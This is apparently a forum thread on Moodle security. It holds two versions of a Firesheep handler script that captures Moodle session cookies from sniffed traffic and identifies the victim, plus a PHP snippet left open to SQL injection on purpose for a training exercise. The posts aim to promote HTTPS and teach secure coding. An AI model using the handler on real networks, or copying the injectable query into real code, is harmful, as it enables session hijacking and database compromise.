You probably heard by now of an extension for Firefox , called Firesheep, that is intended to highlight the problem of stealing session cookies. This is not a new exploit, just a new tool for doing it that has gone a long way in raising awareness of the issue due to its ease-of-use. I've come up with a Moodle handler script for Firesheep, so that you can easily demonstrate if your Moodle site is vulnerable to session cookie theft. If your users are likely to access your site over unencrypted shared media (e.g. public wi-fi hotspots), you ought to consider running your entire site through HTTPS. My intent in posting this handler script is to encourage adoption of HTTPS and, depending on your deployment, possibly to help you justify the cost of SSL accelerators, etc. to management. It is not my intent for you to use this for malicious purposes. It might not be perfect since I had no documented Firesheep API to go on, was too lazy to read all the Firesheep code, and have never done anything in JavaScript before. 
```text
register({
    name: 'Moodle',

    matchPacket: function (packet) {
        for (var cookieName in packet.cookies) {
            if (cookieName == 'MOODLEID_') {
                return true;
            }
        }
    },

    sessionCookieNames: [ 'MOODLEID_', 'MoodleSession' ],

    identifyUser: function () {
        var resp = this.httpGet(this.siteUrl);
        var logininfo = resp.body.querySelector('div.logininfo a');    
        if (logininfo != null) {
            if (logininfo.textContent != "Login") {
                var userIdNum = logininfo.href.split('.php?id=')[1].split('&')[0];
                this.userName = logininfo.textContent;
                this.userAvatar = logininfo.href.split('/user/')[0] + '/user/pix.php/' + userIdNum + '/f1.jpg';
            }
        }
        this.siteName = 'Moodle (' + this.firstPacket.
host
 + ')';
    }
});
```
 I have also attached it as a file, if you want to just use the "Import" button in Firesheep instead of pasting.

I created one where you do not have to specify the cookie, so this will work with all Moodle instances without site specific modifications. 
```text
register({
    name: 'Moodle',

    matchPacket: function (packet) {
        for (var cookieName in packet.cookies) {
            if (cookieName.match(/^MOODLEID_.*$/)) {
                return true;
            }
        }
    },


  processPacket: function () {

    for (var cookieName in this.firstPacket.cookies) {
      if (cookieName.match(/^MOODLEID_.*$/)||cookieName.match(/^MoodleSession.*$/)) {
        this.sessionId = this.firstPacket.cookies[cookieName];
        break;
      }
    }
  },

    identifyUser: function () {
        var resp = this.httpGet(this.siteUrl);
        var logininfo = resp.body.querySelector('div.logininfo a');    
        if (logininfo != null) {
            if (logininfo.textContent != "Login") {
                var userIdNum = logininfo.href.split('.php?id=')[1].split('&')[0];
                this.userName = logininfo.textContent;
                this.userAvatar = logininfo.href.split('/user/')[0] + '/user/pix.php/' + userIdNum + '/f1.jpg';
            }
        }
        this.siteName = 'Moodle (' + this.firstPacket.host + ')';
    }
});
```

I would probably create your own vulnerable files. something like the following in a file somewhere in your root dir could be a good example. 
```text
require_once(__DIR__ . '/config.php');


$username = $_GET['username'];


$record = $DB->get_record_
sql
("SELECT firstname from {user} where username = $username");




echo $record->firstname;
```
 From that example you can then cover: 1) Authenticate the user (require_login) 2) Authorise the user (require_capability/check if this user should be able to view the passed user id.) you can also talk about how to use the original script to get Moodle to output different values instead of the user-fullname. Of course - if you run this in a live scenario on a single box that everyone can access, be prepared for the first student to completely break the site - preventing your other students from being able to do much. Then you could create other scripts that provide examples for other issues - csrf/xss etc etc..

